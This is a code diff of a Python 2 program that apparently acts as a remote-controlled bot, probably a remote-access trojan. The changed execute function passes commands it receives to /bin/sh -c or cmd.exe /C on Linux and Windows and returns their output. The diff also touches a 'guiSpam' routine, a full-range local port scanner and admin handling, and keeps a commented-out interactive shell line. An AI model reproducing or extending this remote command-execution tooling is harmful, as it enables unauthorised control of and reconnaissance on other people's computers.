@@ -35,51 +35,64 @@ def generateNick(operatingSystem): #generates a nick for the server
 def execute(cmd):
 	print "in execute function. we got '%s'" % cmd
 	isItLs = 0
-	if "ls" == cmd[:2]:
-		cmd += " -pA"
+	if "ls" == cmd[:2] or "dir" == cmd[:3]:
+		if operatingSystem == "windows":
+			cmd = "dir /AD /B && echo : && dir /A-D /B"
+		else:
+			cmd += " -pA"
 		isItLs = 1
 
-	#handling a multi-word command
-	cmdList = []
-	if (cmd.find(" ") != -1):
-		cmdList = cmd.split(" ")
-
-		try: #checking for syntax errors
-			p = sub.Popen(cmdList,stdout=sub.PIPE,stderr=sub.PIPE)
-			output, errors = p.communicate()
-		
-		except: #if there was some sytax error, spit back an error
-			print "An error has occured.\n"
-			if "ls" == cmd[:2] and operatingSystem == "windows": #if it was ls and it's on windows, change to dir
-				q = sub.Popen("dir",stdout=sub.PIPE,stderr=sub.PIPE)
-				output, errors = q.communicate()
-			else:
-				return "An error has occured. Probably invalid command or syntax."
-
-	#handles a 1-liner
+	#putting in an array so we can pass to the function
+	if operatingSystem == "windows":
+		cmdList = ["C:\\Windows\\system32\\cmd.exe", "/C"]
 	else:
-		try:#checking for syntax errors
-			p = sub.Popen(cmd,stdout=sub.PIPE,stderr=sub.PIPE)
-			output, errors = p.communicate()
+		cmdList = ["/bin/sh", "-c"]
 
-		except:
-			print "An error has occured.\n"
-			return "An error has occured. Probably invalid command or syntax."
+	cmdList += cmd.split(" ")
+
+	try: #checking for syntax errors
+		p = sub.Popen(cmdList,stdout=sub.PIPE,stderr=sub.PIPE)
+		# p=subprocess.call(["/bin/sh","-i"])
+		output, errors = p.communicate()
+		output = output.replace("\r\n","\n")
+
+	except: #if there was some sytax error, spit back an error
+		print "An error has occured.\n"
+		# if "ls" == cmd[:2] and operatingSystem == "windows": #if it was ls and it's on windows, change to dir
+			# q = sub.Popen("dir",stdout=sub.PIPE,stderr=sub.PIPE)
+			# output, errors = q.communicate()
+		# else:
+		return "An error has occured. Probably invalid command or syntax."
 	
 	if len(output) < 1:
-		return errors
+		if len(errors) > 0:
+			return errors.strip("\r")
+		else:
+			return "No output. Maybe try again."
 
 	#handling multi-line output
 	lines = output.split("\n")[:-1] #split based on newline, return all except last element which is just a blank new line
 	if len(lines) > 1: #if there was a new line found, return array
 		if isItLs: #doing all the directory stuff
+			print "output is as follows:"
+			print output
+			print "lines is as follows:"
+			print lines
+
 			dirs = "dirs: "
 			files = "files: "
-			for line in lines:
-				if line[-1] == "/":
-					dirs += "'" + line + "'   "
-				else:
+			if operatingSystem == "windows":
+				pos = lines.index(": ")
+				for line in lines[:pos]: #directories are everything before a :
+					dirs += "'" + line + "/'   "
+				for line in lines[(pos + 1):]: #files are everything after a :
 					files += "'" + line + "'   "
+			else:
+				for line in lines:
+					if line[-1] == "/":
+						dirs += "'" + line + "'   "
+					else:
+						files += "'" + line + "'   "
 			lines = [dirs.strip(), files.strip()]
 
 		for element in lines: #check if a line is JUST a newline
@@ -273,7 +286,6 @@ def guiSpam(cmd): #spam gui with things
 
 def scanner(cmd): #local port scanner
 	end = 65535 if (cmd == "full") else 1024
-	print "end is '%d'" % end
 	openPorts = []
 	for port in range(1, end):
 		try:
@@ -284,7 +296,10 @@ def scanner(cmd): #local port scanner
 			temp.close()
 		except: continue
 
-	return openPorts
+	if len(openPorts) > 0:
+		return openPorts
+	else:
+		return("No listening ports.")
 
 def admin(cmd): #add/remove admins
 	args = cmd.split(" ")
